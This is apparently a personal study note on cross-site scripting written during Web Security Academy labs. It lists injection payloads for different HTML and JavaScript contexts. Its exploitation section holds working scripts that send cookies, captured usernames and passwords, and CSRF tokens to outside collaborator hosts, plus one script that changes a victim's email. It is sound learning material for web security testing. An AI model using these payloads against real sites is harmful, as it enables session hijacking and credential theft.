#Index
1. [[#^d0ff74|DOM Based XSS]]
2. [[#^c42a57|XSS Contexts]]
	1. [[#^fae923|XSS between HTML tags]] ^d8be6d
	2. [[#^d8be6d|XSS in html attributes]]
	3. [[#^fb2ab3|XSS into Javascript]]
		1. [[#^2339c8|Terminating the existing script]]
		2. [[#^fe9bd1|Breaking out of a JavaScript string]]
		3. [[#^a3f72b|HTML-encoding]]
		4. [[#^557be2|XSS in JavaScript template literals]]
	4. [[#^e1ddf2|Client-side template injection]]
3. [[#^d4e977|Exploiting XSS vulnerabilities]]
	1. [[#^4b6cec|Steal cookies]]
	2. [[#^23b051|Capture passwords]]
	3. [[#^f561b4|Bypass CSRF protections]]

Special chars
```
< > ' " { } ;
```

# DOM Based XSS

^d0ff74

Look for different sinks

## Reflected DOM XSS

```javascript
eval('var data = "reflected string"');

\"-alert(1)}//
```

# XSS Contexts

^c42a57

Tags and attributes blocked
1. Fuzz by tags
2. Fuzz by events
### XSS between HTML tags

^fae923

```javascript
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```


### XSS in HTML tag attributes

```javascript
"><script>alert(document.domain)</script>
" autofocus onfocus=alert(document.domain) x="
<a href="javascript:alert(document.domain)">
```

- Event handlers and href attributes blocked
`<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a`

- svg markup allowed
**Try all the tags and events**
- Canonical tags
`https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`

### XSS into JavaScript

^fb2ab3

##### Terminating the existing script

^2339c8

```html
<script> ... var input = 'controllable data here'; ... </script>
</script><img src=1 onerror=alert(document.domain)>
```
##### Breaking out of a JavaScript string
```javascript
 '-alert(document.domain)-'
 ';alert(document.domain)//
```

##### HTML-encoding

^a3f72b

`When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.`

##### XSS in JavaScript template literals

^557be2

```html
<script> ... var input = `controllable data here`; ... </script>
${alert(document.domain)}
```

### Client-side template injection

^e1ddf2

# Exploiting XSS

^d4e977

### Steal cookies

^4b6cec

```html
<script>fetch("https://4577u22lnpbsoukcip8cifdxroxfl59u.oastify.com/"%2bdocument.cookie);</script>

<script>
fetch('http://burpcollaborator.net',{
	method: 'POST',
	mode: 'no-cors',
	body: document.cookie
});
</script>
```
### Capture passwords

^23b051
Method 1 - Revisar
```html
<form>
	<input name="username182" id="user182">
	<input name="password182" id="password182">
</form>
<script>
	const user182=document.getElementById("user182");
	const password182=document.getElementById("password182");
	password182.addEventListener('change', function(event){
		const passwordValue = event.target.value;
		console.log(passwordValue);
		fetch('https://h9rkyf6yr2f5s7opm2cpmshav11spjd8.oastify.com/', {
			method: 'POST',
			mode: 'no-cors',
			body: 'passwordValue=' + passwordValue
		});
	});
	user182.addEventListener('change', function(event){
		const userValue = event.target.value;
		fetch('https://h9rkyf6yr2f5s7opm2cpmshav11spjd8.oastify.com/', {
			method: 'POST',
			mode: 'no-cors',
			body: 'user=' + userValue
		});
	});
</script>
```

Method 2
```html
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```

### Bypass CSRF protections

^f561b4
Method 1
```javascript
fetch("https://0aa70093034eadee80c15d7f002e0091.web-security-academy.net/my-account")
.then(response => {
	return response.text()
}).then(data => {
	const pattern = /csrf" value="(.*?)"/;
	return data.match(pattern)[1];
}).then(csrf => {
	fetch("https://7fna45coxslvyxufssifsin01r7ivdj2.oastify.com/"+csrf);
	fetch("https://0aa70093034eadee80c15d7f002e0091.web-security-academy.net/my-account/change-email/",{
		method:'POST',
		mode:'no-cors',
		body:'email=pwned@root.com&csrf='+csrf
		});
})
```

Method 2
```html
<script>
	var req = new XMLHttpRequest();
	req.onload = handleResponse;
	req.open('get','/my-account',true);
	req.send();
	function handleResponse() {
		var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
		var changeReq = new XMLHttpRequest();
		changeReq.open('post', '/my-account/change-email',true); 
		changeReq.send('csrf='+token+'&email=test@test.com')
		}; 
</script>
```
# Tips and Tricks

1. JavasScript "replace" may only encode the **first occurrence**

